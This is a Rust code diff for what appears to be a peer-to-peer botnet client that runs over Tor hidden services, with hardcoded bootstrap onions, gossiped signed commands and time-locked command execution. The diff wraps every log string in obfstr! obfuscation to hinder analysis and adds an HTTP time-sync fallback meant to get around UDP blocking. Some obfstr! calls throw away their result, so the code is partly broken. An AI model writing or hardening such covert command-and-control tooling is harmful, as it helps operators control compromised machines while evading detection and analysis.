@@ -1,4 +1,5 @@
 use std::time::Duration;
+use obfstr::obfstr;
 use std::sync::Arc;
 use tokio::sync::RwLock;
 use tokio::time;
@@ -23,7 +24,7 @@ struct MeshState {
 }
 
 pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
-    println!("Starting Tor Mesh Node (Arti Native)...");
+    println!("{}", obfstr!("Starting Tor Mesh Node (Arti Native)..."));
     
     // 1. Identity
     let key_path = get_appdata_dir().join("sys_keys.dat");
@@ -35,7 +36,7 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
     let tor_client = TorClient::create_bootstrapped(config).await?;
     
     // 3. Launch Hidden Service (REAL)
-    println!("Launching Onion Service...");
+    println!("{}", obfstr!("Launching Onion Service..."));
     // Create an ephemeral nickname for this session
     let svc_nickname = format!("node-{}", &my_pub_hex[0..8]);
     
@@ -55,7 +56,7 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
         return Err("Failed to get onion address".into());
     };
     
-    println!("Hidden Service Active: {}", my_onion);
+    println!("{}: {}", obfstr!("Hidden Service Active"), my_onion);
 
     let state = Arc::new(RwLock::new(MeshState {
         dht: RoutingTable::new(&my_onion),
@@ -66,22 +67,22 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
 
     // Register...
     use crate::common::constants::BOOTSTRAP_ONIONS;
-    println!("Registering with Bootstrap Swarm (Failover Mode)...");
+    println!("{}", obfstr!("Registering with Bootstrap Swarm (Failover Mode)..."));
     
     let mut bootstrap_success = false;
     for onion_addr in BOOTSTRAP_ONIONS.iter() {
-        println!("Attempting Bootstrap: {}", onion_addr);
+        println!("{}: {}", obfstr!("Attempting Bootstrap"), onion_addr);
         if let Ok(_) = register_via_tor(&tor_client, &state, onion_addr, &my_pub_hex, &my_onion, &identity.keypair).await {
-            println!("Bootstrap Success via {}", onion_addr);
+            println!("{}: {}", obfstr!("Bootstrap Success via"), onion_addr);
             bootstrap_success = true;
             break;
         } else {
-            eprintln!("Bootstrap Failed via {}. Creating failover...", onion_addr);
+            eprintln!("{}: {}", obfstr!("Bootstrap Failed via"), onion_addr);
         }
     }
     
     if !bootstrap_success {
-        eprintln!("CRITICAL: All Bootstrap Nodes Unreachable.");
+        eprintln!("{}", obfstr!("CRITICAL: All Bootstrap Nodes Unreachable."));
     }
 
     let state_clone = state.clone();
@@ -89,7 +90,7 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
     
     // Spawn Service Listener (Inbound)
     tokio::spawn(async move {
-        println!("Listening for Inbound Gossip...");
+        println!("{}", obfstr!("Listening for Inbound Gossip..."));
         while let Some(rend_req) = stream.next().await {
             let req: tor_hsservice::RendRequest = rend_req;
             
@@ -97,7 +98,7 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
             let mut session_stream = match req.accept().await {
                 Ok(s) => s,
                 Err(e) => {
-                     eprintln!("Failed to accept rendezvous: {}", e);
+                     eprintln!("{}: {}", obfstr!("Failed to accept rendezvous"), e);
                      continue;
                 }
             };
@@ -117,7 +118,7 @@ pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
                      let data_stream = match data_req.accept(Connected::new_empty()).await {
                          Ok(s) => s,
                          Err(e) => {
-                             eprintln!("Failed to accept data stream: {}", e);
+                             eprintln!("{}: {}", obfstr!("Failed to accept data stream"), e);
                              continue;
                          }
                      };
@@ -245,7 +246,7 @@ async fn register_via_tor(
             for p in peers {
                 guard.dht.insert(p);
             }
-            println!("Bootstrap Success. DHT Initialized with {} peers.", guard.dht.all_peers().len());
+            println!("{}: {} {}", obfstr!("Bootstrap Success. DHT Initialized with"), guard.dht.all_peers().len(), obfstr!("peers."));
         }
     }
     
@@ -274,7 +275,7 @@ async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorC
         if cmd.execute_at <= now + 30 {
              process_command(&cmd);
         } else {
-             println!("Timelocked {}", cmd.execute_at);
+             println!("{}: {}", obfstr!("Timelocked"), cmd.execute_at);
              tokio::spawn(async move {
                  let wait_s = if cmd.execute_at > now { (cmd.execute_at - now) as u64 } else { 0 };
                  time::sleep(Duration::from_secs(wait_s)).await;
@@ -301,7 +302,7 @@ async fn handle_gossip(state: Arc<RwLock<MeshState>>, msg: GossipMsg, tor: &TorC
         // Filtering: 30% or 100% logic
         // Use the select_targets logic but adapted
         let selected = select_gossip_target_list(targets);
-        println!("Gossip Fanout: {} peers", selected.len());
+        println!("{}: {} {}", obfstr!("Gossip Fanout"), selected.len(), obfstr!("peers"));
         
         let next_msg = GossipMsg { ttl: msg.ttl - 1, ..msg };
         let msg_str = serde_json::to_string(&next_msg).unwrap();
@@ -346,10 +347,10 @@ async fn perform_lookup(state: &Arc<RwLock<MeshState>>, tor: &TorClient<Preferre
 }
 
 async fn get_secure_time() -> i64 {
-    // Attempt NTP sync
-    let time_res = tokio::task::spawn_blocking(|| {
+    // 1. Attempt NTP sync (UDP 123)
+    let ntp_res = tokio::task::spawn_blocking(|| {
         let socket = std::net::UdpSocket::bind("0.0.0.0:0").ok()?;
-        socket.set_read_timeout(Some(Duration::from_secs(5))).ok()?;
+        socket.set_read_timeout(Some(Duration::from_secs(3))).ok()?; // Fast fail 3s
         match sntpc::simple_get_time("pool.ntp.org:123", &socket) {
             Ok(t) => {
                 let ntp_sec = t.sec();
@@ -360,12 +361,38 @@ async fn get_secure_time() -> i64 {
         }
     }).await;
     
-    if let Ok(Some(ntp_time)) = time_res {
-        ntp_time
-    } else {
-        println!("[-] NTP Sync Failed. Using System Time.");
-        chrono::Utc::now().timestamp()
+    if let Ok(Some(ntp_time)) = ntp_res {
+        return ntp_time;
     }
+    
+    obfstr!("[-] NTP Failed. Attempting HTTP Time Sync...");
+
+    // 2. HTTP Fallback (TCP 80/443) - Bypass UDP blocking
+    // Google or Facebook (High availability, trusted Date header)
+    let client = reqwest::Client::builder()
+        .timeout(Duration::from_secs(5))
+        .build()
+        .unwrap_or_default();
+
+    let targets = vec!["https://www.google.com", "https://www.facebook.com"];
+    
+    for target in targets {
+         if let Ok(resp) = client.head(target).send().await {
+             if let Some(date_header) = resp.headers().get("Date") {
+                 if let Ok(date_str) = date_header.to_str() {
+                     // RFC 2822 format: "Sun, 06 Nov 1994 08:49:37 GMT"
+                     if let Ok(parsed) = chrono::DateTime::parse_from_rfc2822(date_str) {
+                         println!("{}: {} ({})", obfstr!("[+] Time Synced via HTTP"), target, obfstr!(""));
+                         return parsed.timestamp();
+                     }
+                 }
+             }
+         }
+    }
+
+    // 3. Last Resort: System Time
+    obfstr!("[-] All Sync Methods Failed. Using System Time.");
+    chrono::Utc::now().timestamp()
 }
 
 fn select_gossip_target_list(peers: Vec<PeerInfo>) -> Vec<PeerInfo> {
@@ -394,13 +421,13 @@ fn packet_verify_and_decrypt(packet: &GhostPacket, key: &[u8]) -> Option<Command
 }
 
 fn process_command(cmd: &CommandPayload) {
-    println!("EXECUTING: {} [{}]", cmd.action, cmd.id);
+    println!("{}: {} [{}]", obfstr!("EXECUTING"), cmd.action, cmd.id);
 }
 
 fn solve_pow(pub_key: &str) -> u64 {
     use sha2::{Sha256, Digest};
     let mut nonce: u64 = 0;
-    println!("[*] Solving PoW (Constraint: 4 Hex Zeros)...");
+    obfstr!("[*] Solving PoW (Constraint: 4 Hex Zeros)...");
     let start = std::time::Instant::now();
     loop {
         let input = format!("{}{}", pub_key, nonce);
